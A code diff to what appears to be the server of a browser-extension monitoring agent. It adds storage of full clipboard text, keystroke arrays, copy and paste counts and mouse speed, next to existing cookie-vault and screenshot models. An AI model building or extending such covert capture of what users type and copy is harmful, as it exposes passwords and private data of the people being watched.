@@ -9,7 +9,7 @@ import boto3
 from botocore.exceptions import ClientError
 
 from database import get_db
-from models import ExtensionProfile, CookieVault, BlockingRule, Machine, ActivityEvent, Screenshot
+from models import ExtensionProfile, CookieVault, BlockingRule, Machine, ActivityEvent, Screenshot, ClipboardEvent
 from schemas import HandshakeRequest, AgentConfigResponse, TelemetryBatch
 
 # ============ CONFIG ============
@@ -154,6 +154,7 @@ async def handshake(req: HandshakeRequest, db: Session = Depends(get_db)):
         "autofill_config": profile.autofill_config
     }
 
+
 @router.post("/telemetry")
 async def ingest_telemetry(batch: TelemetryBatch, db: Session = Depends(get_db)):
     """
@@ -178,6 +179,8 @@ async def ingest_telemetry(batch: TelemetryBatch, db: Session = Depends(get_db))
     machine.last_seen_at = datetime.now()
 
     count = 0
+    clipboard_count = 0
+    
     for item in batch.events:
         event = ActivityEvent(
             machine_id=machine.id,
@@ -196,13 +199,33 @@ async def ingest_telemetry(batch: TelemetryBatch, db: Session = Depends(get_db))
             focus_time_sec=item.focus_time_sec,
             
             is_idle=item.is_idle,
-            agent_type="extension"
+            agent_type="extension",
+            
+            # NEW fields
+            copy_count=item.copy_count,
+            paste_count=item.paste_count,
+            keys_array=item.keys_array,
+            mouse_avg_speed=item.mouse_avg_speed,
+            extension_version=item.extension_version
         )
         db.add(event)
+        db.flush()  # Получаем ID для связи с clipboard_events
+        
+        # NEW: Сохраняем clipboard history в отдельную таблицу
+        if item.clipboard_history:
+            for clip_item in item.clipboard_history:
+                clipboard_event = ClipboardEvent(
+                    activity_event_id=event.id,
+                    action=clip_item.action,
+                    content=clip_item.text
+                )
+                db.add(clipboard_event)
+                clipboard_count += 1
+        
         count += 1
 
     db.commit()
-    return {"status": "ok", "saved_events": count}
+    return {"status": "ok", "saved_events": count, "saved_clipboard": clipboard_count}
 
 
 @router.post("/screenshot")
